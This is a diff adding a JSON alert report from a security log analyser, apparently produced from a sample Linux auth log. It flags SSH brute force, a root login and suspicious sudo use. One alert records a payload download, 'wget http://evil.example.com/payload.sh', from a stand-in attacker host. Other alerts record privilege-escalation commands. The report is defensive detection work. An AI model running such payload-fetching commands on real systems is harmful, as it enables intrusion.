@@ -1,0 +1,194 @@
+{
+  "meta": {
+    "file": "samples/sample_auth.log",
+    "log_type": "linux_auth",
+    "analyzed_at": "2026-04-12T11:17:17.378057",
+    "total_alerts": 13,
+    "severity_summary": {
+      "CRITICAL": 1,
+      "HIGH": 5,
+      "MEDIUM": 7
+    }
+  },
+  "stats": {
+    "total_lines": 35,
+    "failed_ssh": 25,
+    "successful_ssh": 3,
+    "sudo_commands": 3,
+    "unique_ips": [
+      "10.0.0.55",
+      "203.0.113.42",
+      "10.0.0.10",
+      "10.0.0.20",
+      "192.168.1.105",
+      "45.33.32.156"
+    ],
+    "targeted_users": {
+      "admin": 3,
+      "root": 3,
+      "ubuntu": 3,
+      "test": 2,
+      "deploy": 1,
+      "bilal": 3,
+      "oracle": 3,
+      "mysql": 1,
+      "postgres": 1,
+      "git": 1,
+      "pi": 4
+    },
+    "ip_fail_counts": {
+      "192.168.1.105": 12,
+      "10.0.0.55": 3,
+      "203.0.113.42": 10
+    }
+  },
+  "alerts": [
+    {
+      "severity": "CRITICAL",
+      "title": "Root SSH Login Succeeded",
+      "description": "Root login accepted from 45.33.32.156 at Apr  8 03:10:11",
+      "data": {
+        "ip": "45.33.32.156",
+        "user": "root",
+        "timestamp": "Apr  8 03:10:11"
+      },
+      "recommendation": "Immediate investigation required. Disable root SSH login (PermitRootLogin no).",
+      "timestamp": "2026-04-12T11:17:17.377526"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Suspicious Sudo Command",
+      "description": "User bilal ran sensitive command via sudo: /bin/bash at Apr  8 03:01:14",
+      "data": {
+        "user": "bilal",
+        "command": "/bin/bash",
+        "timestamp": "Apr  8 03:01:14"
+      },
+      "recommendation": "Review whether this command is authorized. Check for privilege escalation.",
+      "timestamp": "2026-04-12T11:17:17.377326"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Suspicious Sudo Command",
+      "description": "User bilal ran sensitive command via sudo: /usr/bin/passwd root at Apr  8 03:05:22",
+      "data": {
+        "user": "bilal",
+        "command": "/usr/bin/passwd root",
+        "timestamp": "Apr  8 03:05:22"
+      },
+      "recommendation": "Review whether this command is authorized. Check for privilege escalation.",
+      "timestamp": "2026-04-12T11:17:17.377504"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Suspicious Sudo Command",
+      "description": "User deploy ran sensitive command via sudo: /usr/bin/wget http://evil.example.com/payload.sh at Apr  8 06:00:00",
+      "data": {
+        "user": "deploy",
+        "command": "/usr/bin/wget http://evil.example.com/payload.sh",
+        "timestamp": "Apr  8 06:00:00"
+      },
+      "recommendation": "Review whether this command is authorized. Check for privilege escalation.",
+      "timestamp": "2026-04-12T11:17:17.377986"
+    },
+    {
+      "severity": "HIGH",
+      "title": "SSH Brute Force Detected",
+      "description": "IP 192.168.1.105 had 12 failed SSH login attempts",
+      "data": {
+        "ip": "192.168.1.105",
+        "failed_attempts": 12
+      },
+      "recommendation": "Block IP 192.168.1.105 via firewall (iptables/ufw). Investigate origin.",
+      "timestamp": "2026-04-12T11:17:17.378001"
+    },
+    {
+      "severity": "HIGH",
+      "title": "SSH Brute Force Detected",
+      "description": "IP 203.0.113.42 had 10 failed SSH login attempts",
+      "data": {
+        "ip": "203.0.113.42",
+        "failed_attempts": 10
+      },
+      "recommendation": "Block IP 203.0.113.42 via firewall (iptables/ufw). Investigate origin.",
+      "timestamp": "2026-04-12T11:17:17.378006"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "Sudo Authentication Failure",
+      "description": "User www-data failed sudo authentication at Apr  8 04:00:00",
+      "data": {
+        "user": "www-data",
+        "timestamp": "Apr  8 04:00:00"
+      },
+      "recommendation": "May indicate password guessing or unauthorized privilege escalation attempt.",
+      "timestamp": "2026-04-12T11:17:17.377787"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "Targeted User Account",
+      "description": "Account 'admin' was targeted 3 times via SSH",
+      "data": {
+        "user": "admin",
+        "attempts": 3
+      },
+      "recommendation": "Consider disabling password auth for this account. Use SSH keys only.",
+      "timestamp": "2026-04-12T11:17:17.378011"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "Targeted User Account",
+      "description": "Account 'root' was targeted 3 times via SSH",
+      "data": {
+        "user": "root",
+        "attempts": 3
+      },
+      "recommendation": "Consider disabling password auth for this account. Use SSH keys only.",
+      "timestamp": "2026-04-12T11:17:17.378014"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "Targeted User Account",
+      "description": "Account 'ubuntu' was targeted 3 times via SSH",
+      "data": {
+        "user": "ubuntu",
+        "attempts": 3
+      },
+      "recommendation": "Consider disabling password auth for this account. Use SSH keys only.",
+      "timestamp": "2026-04-12T11:17:17.378017"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "Targeted User Account",
+      "description": "Account 'bilal' was targeted 3 times via SSH",
+      "data": {
+        "user": "bilal",
+        "attempts": 3
+      },
+      "recommendation": "Consider disabling password auth for this account. Use SSH keys only.",
+      "timestamp": "2026-04-12T11:17:17.378019"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "Targeted User Account",
+      "description": "Account 'oracle' was targeted 3 times via SSH",
+      "data": {
+        "user": "oracle",
+        "attempts": 3
+      },
+      "recommendation": "Consider disabling password auth for this account. Use SSH keys only.",
+      "timestamp": "2026-04-12T11:17:17.378021"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "Targeted User Account",
+      "description": "Account 'pi' was targeted 4 times via SSH",
+      "data": {
+        "user": "pi",
+        "attempts": 4
+      },
+      "recommendation": "Consider disabling password auth for this account. Use SSH keys only.",
+      "timestamp": "2026-04-12T11:17:17.378024"
+    }
+  ]
+}
